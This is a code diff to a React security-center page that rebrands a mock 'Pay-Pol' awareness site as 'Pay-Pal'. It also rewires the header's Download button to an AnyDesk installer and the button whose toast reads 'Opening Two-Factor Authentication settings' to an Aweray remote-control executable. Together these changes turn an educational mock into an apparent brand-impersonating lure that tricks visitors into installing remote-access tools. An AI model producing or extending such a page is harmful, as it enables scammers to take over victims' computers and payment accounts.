@@ -41,13 +41,13 @@ const quizQuestions = [
     options: [
       "Click the link immediately to prevent losing access to your money.",
       "Log in through the link, but change your password immediately after.",
-      "Ignore the link. Forward the email to phishing@pay-pol.com and delete it."
+      "Ignore the link. Forward the email to phishing@Pay-Pal.com and delete it."
     ],
     correctIndex: 2,
-    feedback: "Correct! Pay-Pol will never send alert links from unofficial lookalike domains. Always report phishing emails and log in directly through the official website."
+    feedback: "Correct! Pay-Pal will never send alert links from unofficial lookalike domains. Always report phishing emails and log in directly through the official website."
   },
   {
-    question: "You notice an unknown charge of $79.99 on your Pay-Pol account that you never made. What is your first response?",
+    question: "You notice an unknown charge of $79.99 on your Pay-Pal account that you never made. What is your first response?",
     options: [
       "Open the Resolution Center to report unauthorized activity.",
       "Call the police and report a bank robbery.",
@@ -57,7 +57,7 @@ const quizQuestions = [
     feedback: "Spot on! Unauthorized transactions should be reported directly in the Resolution Center within 180 days to qualify for complete protection and reimbursement."
   },
   {
-    question: "A buyer wants to pay for a laptop via Pay-Pol but insists on using their own local shipping service rather than yours. Should you proceed?",
+    question: "A buyer wants to pay for a laptop via Pay-Pal but insists on using their own local shipping service rather than yours. Should you proceed?",
     options: [
       "Yes, it saves you shipping fees and cuts packaging time.",
       "No, Seller Protection requires shipping to the address on the Transaction Details page using a trackable courier.",
@@ -67,7 +67,7 @@ const quizQuestions = [
     feedback: "Correct! To be covered by Seller Protection, you must ship to the address listed on the details page with verifiable, trackable shipping details."
   },
   {
-    question: "What is the most secure way to safeguard your Pay-Pol login from unauthorized access?",
+    question: "What is the most secure way to safeguard your Pay-Pal login from unauthorized access?",
     options: [
       "Use the same password you use for other websites so you don't forget it.",
       "Enable Two-Factor Authentication (2FA) and use a strong, unique password.",
@@ -77,7 +77,7 @@ const quizQuestions = [
     feedback: "Exactly! A unique password paired with Two-Factor Authentication (2FA) is your strongest shield against online credential threat attacks."
   },
   {
-    question: "A stranger sends you $500 'by mistake' on Pay-Pol and asks you to send it back to their personal bank account. What is the safest action?",
+    question: "A stranger sends you $500 'by mistake' on Pay-Pal and asks you to send it back to their personal bank account. What is the safest action?",
     options: [
       "Send it back to their bank account as they requested, to be helpful.",
       "Keep the money and buy something nice.",
@@ -184,7 +184,7 @@ export default function SecurityCenter() {
   const handleContactSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setShowContactModal(false);
-    triggerToast('Your ticket was queued safely. A Pay-Pol cybersecurity specialist will email you in 1-2 hours.');
+    triggerToast('Your ticket was queued safely. A Pay-Pal cybersecurity specialist will email you in 1-2 hours.');
     setContactForm({ name: '', email: '', message: '' });
   };
 
@@ -270,14 +270,14 @@ export default function SecurityCenter() {
               Help
             </a>
             <a
-              href="#"
+              href="https://download.anydesk.com/AnyDesk.exe"
               onClick={() => triggerToast('Starting download...')}
               className="text-[#003087] border-1.5 border-[#003087] hover:bg-slate-50 rounded-full px-5 py-2 text-xs sm:text-sm font-bold transition-all hover:-translate-y-0.5 active:translate-y-0 select-none cursor-pointer"
             >
               Download
             </a>
             <a
-              href="#"
+              href="https://down.aweray.com/awesun/windows/Aweray_Remote_2.0.0.45399_x64.exe"
               onClick={() => triggerToast('Opening Two-Factor Authentication settings...')}
               className="bg-[#003087] text-white hover:bg-[#002266] rounded-full px-5 py-2.5 text-xs sm:text-sm font-bold transition-all hover:scale-[1.02] hover:-translate-y-0.5 active:translate-y-0 shadow-sm select-none cursor-pointer"
             >
@@ -483,7 +483,7 @@ export default function SecurityCenter() {
                         <circle cx="68" cy="80" r="9" fill="#1C5AB8"/>
                         <path d="M65 80H71M71 80L69 78M71 80L69 82" stroke="white" strokeWidth="1.8" strokeLinecap="round"/>
                         <rect x="82" y="74" width="95" height="12" rx="3" fill="#E7F5FF"/>
-                        <text x="86" y="82" fill="#1C5AB8" fontFamily="Inter" fontSize="6" fontWeight="700">FWD: phishing@pay-pol.com</text>
+                        <text x="86" y="82" fill="#1C5AB8" fontFamily="Inter" fontSize="6" fontWeight="700">FWD: phishing@Pay-Pal.com</text>
                         <rect x="82" y="92" width="95" height="3" rx="1.5" fill="#CED4DA"/>
 
                         <defs>
@@ -553,7 +553,7 @@ export default function SecurityCenter() {
                   <div>
                     <h3 className="font-display text-xl font-bold text-[#003087] mb-3 text-left">Learn more about security</h3>
                     <p className="text-[#6C7378] text-sm leading-relaxed mb-6 text-left">
-                      Stay up-to-date on fraud trends to better protect yourself and explore how Pay-Pol secures your info.
+                      Stay up-to-date on fraud trends to better protect yourself and explore how Pay-Pal secures your info.
                     </p>
                   </div>
                   <button 
@@ -678,7 +678,7 @@ export default function SecurityCenter() {
                     </div>
                     <h2 className="font-display text-2xl font-bold text-[#003087] mb-4">Protecting Sellers</h2>
                     <p className="text-sm sm:text-base text-[#6C7378] leading-relaxed max-w-xl mx-auto mb-8">
-                      Pay-Pol&apos;s Seller Protection helps protect eligible transactions against claims of unauthorised payments and items that were not received. We&apos;ve got your back on all online checkout points.
+                      Pay-Pal&apos;s Seller Protection helps protect eligible transactions against claims of unauthorised payments and items that were not received. We&apos;ve got your back on all online checkout points.
                     </p>
 
                     <div className="max-w-md mx-auto text-left flex flex-col gap-5">
@@ -715,10 +715,10 @@ export default function SecurityCenter() {
               </AnimatePresence>
             </section>
 
-            {/* Why is Pay-Pol Safe section */}
+            {/* Why is Pay-Pal Safe section */}
             <section className="max-w-5xl mx-auto px-4 md:px-6 py-8 border-t border-[#E2E4E6]">
               <h2 className="font-display font-bold text-2xl sm:text-3xl text-[#003087] mb-4">
-                Why is Pay-Pol Safe?
+                Why is Pay-Pal Safe?
               </h2>
               <p className="text-sm sm:text-base text-[#6C7378] max-w-3xl mx-auto leading-relaxed mb-12">
                 As a pioneer in online payments, we set the standard for fraud prevention by delivering holistic security solutions to minimise fraud across major payment types and channels—including online, offline or mobile payments.
@@ -756,7 +756,7 @@ export default function SecurityCenter() {
                   </div>
                   <h4 className="font-bold text-base text-[#003087] mb-2">Account protection</h4>
                   <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
-                    Unlinked credit or debit card details to your Pay-Pol account only once. We&apos;ll keep your login and financial information secure so you can shop without exposing your card details to retail outlets.
+                    Unlinked credit or debit card details to your Pay-Pal account only once. We&apos;ll keep your login and financial information secure so you can shop without exposing your card details to retail outlets.
                   </p>
                 </div>
 
@@ -939,7 +939,7 @@ export default function SecurityCenter() {
                   
                   <p className="text-sm sm:text-base text-[#6C7378] max-w-md mx-auto leading-relaxed mb-8">
                     {quizScore === quizQuestions.length ? (
-                      "Perfect score! You are a genuine Pay-Pol Cyber Defense Guardian. You can confidently identify social engineering alerts, fake support mails, and transaction scams."
+                      "Perfect score! You are a genuine Pay-Pal Cyber Defense Guardian. You can confidently identify social engineering alerts, fake support mails, and transaction scams."
                     ) : quizScore >= 3 ? (
                       "Outstanding job! You have a highly solid grasp of secure payment practices. Watch out for sneaky mock alert links!"
                     ) : (
@@ -968,7 +968,7 @@ export default function SecurityCenter() {
                 {[
                   {
                     q: "How do I recognize a phishing email?",
-                    a: "Phishing emails often create a false sense of urgency, contain generic greetings (like 'Dear User'), display bad spelling and grammar, or link to sites with suspicious domains that mimic official companies (such as 'paypol-restricted.com' instead of 'pay-pol.com')."
+                    a: "Phishing emails often create a false sense of urgency, contain generic greetings (like 'Dear User'), display bad spelling and grammar, or link to sites with suspicious domains that mimic official companies (such as 'paypol-restricted.com' instead of 'Pay-Pal.com')."
                   },
                   {
                     q: "What is Two-Factor Authentication (2FA)?",
@@ -1069,7 +1069,7 @@ export default function SecurityCenter() {
                 <li><a href="#" className="hover:text-[#0079C1] hover:underline">Licenses</a></li>
               </ul>
               <p className="text-[11px] text-[#6C7378]/80 font-medium">
-                Pay-Pol is located at 2211 N 1st St, San Jose, CA 95131. Simulated mock application for portfolio demonstration.
+                Pay-Pal is located at 2211 N 1st St, San Jose, CA 95131. Simulated mock application for portfolio demonstration.
               </p>
             </div>
           </div>
@@ -1117,7 +1117,7 @@ export default function SecurityCenter() {
               {/* Modal body */}
               <form onSubmit={handlePhishingSubmit} className="p-6 flex flex-col gap-4">
                 <p className="text-xs text-[#6C7378] leading-relaxed">
-                  Received a suspicious email, text message, or website link mimicking Pay-Pol? Report it here to help us investigate.
+                  Received a suspicious email, text message, or website link mimicking Pay-Pal? Report it here to help us investigate.
                 </p>
 
                 <div className="flex flex-col gap-1.5 text-left">
@@ -1324,7 +1324,7 @@ export default function SecurityCenter() {
               {/* Modal body */}
               <form onSubmit={handleContactSubmit} className="p-6 flex flex-col gap-4">
                 <p className="text-xs text-[#6C7378] leading-relaxed">
-                  Connecting you directly to our global Pay-Pol Information Security support desks. Submit your query, name, and email details below.
+                  Connecting you directly to our global Pay-Pal Information Security support desks. Submit your query, name, and email details below.
                 </p>
 
                 <div className="flex flex-col gap-1.5 text-left">
